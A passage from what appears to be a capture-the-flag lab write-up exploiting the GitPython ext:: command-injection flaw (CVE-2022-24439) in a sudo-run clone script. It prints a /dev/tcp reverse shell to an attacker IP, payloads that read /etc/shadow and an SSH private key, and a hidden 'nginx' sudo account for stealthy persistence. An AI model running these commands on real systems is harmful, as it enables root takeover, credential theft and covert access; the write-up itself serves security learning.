+            <button class="copy-button" state="copy" data="os.chdir%28%27/opt/internal_apps/clone_changes%27%29">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>os<span style="color:#f92672">.</span>chdir(<span style="color:#e6db74">&#39;/opt/internal_apps/clone_changes&#39;</span>)</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>Changes the current working directory to <code>/opt/internal_apps/clone_changes</code>.</li>
+<li>This ensures that subsequent operations (e.g., creating or cloning repositories) occur in this directory.</li>
+</ul>
+</li>
+<li>
+<p><strong>Command-Line Argument Handling</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="url_to_clone%20=%20sys.argv[1]">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>url_to_clone <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><code>sys.argv[1]</code>: Takes the first command-line argument after the script name as the URL of the repository to be cloned.</li>
+</ul>
+</li>
+<li>
+<p><strong>Initialize Bare Git Repository</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="r%20=%20Repo.init%28%27%27,%20bare=True%29">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>r <span style="color:#f92672">=</span> Repo<span style="color:#f92672">.</span>init(<span style="color:#e6db74">&#39;&#39;</span>, bare<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><code>Repo.init('', bare=True)</code>: Initializes a new bare Git repository in the current directory (&rsquo;&rsquo; refers to the current path).
+<ul>
+<li>A bare repository has no working tree and is typically used as a remote/shared repository.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Clone a Repository</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="r.clone_from%28url_to_clone,%20%27new_changes%27,%20multi_options=[%22-c%20protocol.ext.allow=always%22]%29">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>r<span style="color:#f92672">.</span>clone_from(url_to_clone, <span style="color:#e6db74">&#39;new_changes&#39;</span>, multi_options<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;-c protocol.ext.allow=always&#34;</span>])</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><code>r.clone_from(url_to_clone, 'new_changes')</code>: Clones the repository from url_to_clone into a directory named new_changes within the current working directory.</li>
+<li><code>multi_options=[&quot;-c protocol.ext.allow=always&quot;]</code>: Adds a Git configuration option:
+<ul>
+<li><code>-c protocol.ext.allow=always</code>: Allows the <code>protocol.ext transport</code>, enabling custom protocol handlers.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>What does that mean in english? Here&rsquo;s a simpler explanation</strong>:
+For the most part the script is very simple, it takes a supplied git repo as an argument and will clone it into a directory called new_changes with the current working directory. However the temporary addition being added is an issue as it allows us to execute code on the host.</p>
+<ol>
+<li>What does <code>multi_options=[&quot;-c protocol.ext.allow=always&quot;]</code> do?
+<ul>
+<li>It adds a temporary configuration to the Git command being run by the script.</li>
+</ul>
+</li>
+<li>What is <code>protocol.ext?</code>
+<ul>
+<li>It&rsquo;s a Git feature that allows you to define custom commands or handlers for specific types of repository URLs.</li>
+</ul>
+</li>
+<li>What does <code>-c protocol.ext.allow=always</code> mean?
+<ul>
+<li>It tells Git: &ldquo;It&rsquo;s okay to run custom commands whenever a repository URL starts with <code>ext::</code>.&rdquo;</li>
+</ul>
+</li>
+<li><strong>Why is this important</strong>?
+<ul>
+<li>Normally, Git disables this feature because it can be dangerous. Because it allows us to provide an argument like the below and have it execute on the host system. And as we are allowed to execute this script as root our commands will run as root!</li>
+<li>e.g. <code>ext::sh -c 'cat //root//.ssh/id_rsa'</code></li>
+<li>If we google &ldquo;GitPython rce&rdquo; we find <a href="https://www.cve.org/CVERecord?id=CVE-2022-24439">CVE-2022-24439</a>.</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="4-dot-privilege-escalation">4. Privilege Escalation:</h2>
+<h3 id="using-cve-2022-24439-gitpython-vulnerability-to-get-a-root-shell-dot">Using CVE-2022-24439 GitPython Vulnerability to get a root shell.</h3>
+<ul>
+<li>
+<p>Initially I check if <code>nc</code> is installed and it is however it has been compiled without the <code>-c</code> or <code>-e</code> flags so we cannot use it for reverse shell.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-083007_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>This means we will need to use a bash shell. I run the following command to create a bash shell in the <code>/tmp/</code> folder:</p>
+<ul>
+<li><code>echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.80/80 0&gt;&amp;1&quot; &gt;&gt; /tmp/notashell.sh</code></li>
+</ul>
+</li>
+<li>
+<p>I start my listener:</p>
+<ul>
+<li><code>rlwrap -cAr nc -nvlp 80</code></li>
+</ul>
+</li>
+<li>
+<p>Run the python script whilst passing the shell as an argument:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="sudo%20python3%20/opt/internal_apps/clone_changes/clone_prod_change.py%20%27ext::sh%20-c%20bash%25%20/tmp/notashell.sh%27">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span style="color:#e6db74">&#39;ext::sh -c bash% /tmp/notashell.sh&#39;</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-084600_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Get our root flag:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-084641_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="why-do-we-need-the-sign-after-bash">Why do we need the <code>%</code> sign after bash:</h3>
+<ul>
+<li>
+<p>So this was annoying me for sometime and I looked into it, every-time there is a space we need to supply the <code>%</code> to escape due to how <code>argv</code> handles special characters.</p>
+</li>
+<li>
+<p>For instance we can read <code>/etc/shadow</code> by copying it to <code>/tmp/shad</code> by doing this:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="sudo%20python3%20/opt/internal_apps/clone_changes/clone_prod_change.py%20%27ext::sh%20-c%20cat%25%20/etc/shadow%25%20%3e%3e%25%20/tmp/shad%27">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span style="color:#e6db74">&#39;ext::sh -c cat% /etc/shadow% &gt;&gt;% /tmp/shad&#39;</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>We can then see if we navigate to <code>/tmp</code> we can read the file.
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-085121_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>This means any command can be run provided any spaces are followed by <code>%</code> symbol.
+<ul>
+<li>
+<p>Read the root flag this way:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="sudo%20python3%20/opt/internal_apps/clone_changes/clone_prod_change.py%20%27ext::sh%20-c%20cat%25%20/root/root.txt%25%20%3e%3e%25%20/tmp/root.flag%27">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span style="color:#e6db74">&#39;ext::sh -c cat% /root/root.txt% &gt;&gt;% /tmp/root.flag&#39;</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-085355_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="5-dot-persistence">5. Persistence:</h2>
+<h3 id="creating-a-high-privileged-service-account-for-persistence">Creating a high privileged &ldquo;service&rdquo; account for persistence:</h3>
+<ul>
+<li>
+<p>I create an account called &ldquo;nginx&rdquo; and give myself root privileges &amp; access to the bash shell. I use this name as it&rsquo;s one you could see on a machine and will raise less suspicion.</p>
+</li>
+<li>
+<figure><img src="/ox-hugo/2024-12-22-090631_.png">
+</figure>
+
+<ul>
+<li>
+<p><code>sudo useradd -m -s /bin/bash nginx</code></p>
+<ul>
+<li>Creates a new user named <code>nginx</code>.</li>
+<li><code>-m</code>: Creates a home directory for the user.</li>
+<li><code>-s /bin/bash</code>: Sets the user&rsquo;s default shell to <code>/bin/bash</code>.</li>
+</ul>
+</li>
+<li>
+<p><code>sudo usermod -aG sudo nginx</code></p>
+<ul>
+<li>Adds the <code>nginx</code> user to the <code>sudo</code> group.</li>
+<li><code>-a</code>: Appends the user to the group (avoids overwriting existing groups).</li>
+<li><code>-G sudo</code>: Specifies the <code>sudo</code> group.</li>
+</ul>
+</li>
+<li>
+<p><code>sudo passwd nginx</code></p>
+<ul>
+<li>Sets or updates the password for the <code>nginx</code> user.</li>
+<li>Prompts us to add a new password and confirms it.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>I switch to the newly created user</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-090700_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I check we have sudo privileges, as expected we do.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-090731_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I ensure we can actually read sudo level files by reading <code>/etc/shadow</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-090801_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
+<li>I learned about retrieving data from git logs.</li>
+<li>I learned about the python git vulnerability CVE-2022-24439:</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>Oh I did not use a forward slash at one point in a command and that was stumping reading the API endpoints at one point, that was fun.</li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at proton dot me</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        2662
+                    
+                </li>
+            
+
+
+            
+                <li>en</li>
+            
+
+            
+
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Dec 22 2024 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
